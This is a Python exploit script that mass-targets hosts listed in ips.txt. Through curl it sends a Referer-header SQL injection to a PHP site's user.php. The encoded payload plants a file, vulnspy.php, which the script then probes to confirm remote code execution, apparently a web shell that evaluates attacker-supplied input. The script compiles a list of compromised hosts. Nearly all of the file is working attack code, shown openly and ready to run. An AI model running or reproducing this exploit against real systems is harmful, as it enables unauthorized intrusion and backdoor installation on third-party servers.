#!/usr/bin/env python
# -*- coding:utf-8 -*-

"""
    references:
        https://www.anquanke.com/post/id/158677
        http://www.freebuf.com/vuls/182899.html
"""

import os
import requests

payload = ''' --connect-timeout 10 -m 20 -d 'action=login&vulnspy=phpinfo();exit;' -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'"'"'/*";s:3:"num";s:201:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca'
'''
succeed = set()


def attack(ip_port):
    # step 1 : construct target url
    # distinguish http/https
    proto = 'http'
    if ':' in ip_port:
        ip, port = ip_port.split(':')
        if port == '443':
            proto = 'https'

    target = '{}://{}/user.php'.format(proto, ip_port)

    # step 2 : construct command to execute
    cmd = 'curl {} {}'.format(target, payload)
    try:
        # step 3: execute curl command
        result = os.popen(cmd).read()

        # step 4: check whether vulnerable
        cmd2 = '{}://{}/vulnspy.php?vulnspy=phpinfo();'.format(proto, ip_port)
        request = requests.get(cmd2, timeout=15)

        print(request.status_code)
        print()
        if request.status_code == 200 and 'PHP Version' in request.text:
            msg = '{} is vulnerable to rce\n'.format(ip_port)
            succeed.add(ip_port)
            print(msg)
    except:
        pass


if __name__ == '__main__':
    # target = '*.*.*.*'
    i = 1
    with open('ips.txt', 'r') as fr:
        for line in fr.readlines():
            target = line.strip()
            print('%d : checkng %s' % (i, target))
            i += 1
            attack(target)

    if len(succeed) != 0:
        print('\n\n\n------ following hosts are vulnerable --------')
        for line in succeed:
            print(line)

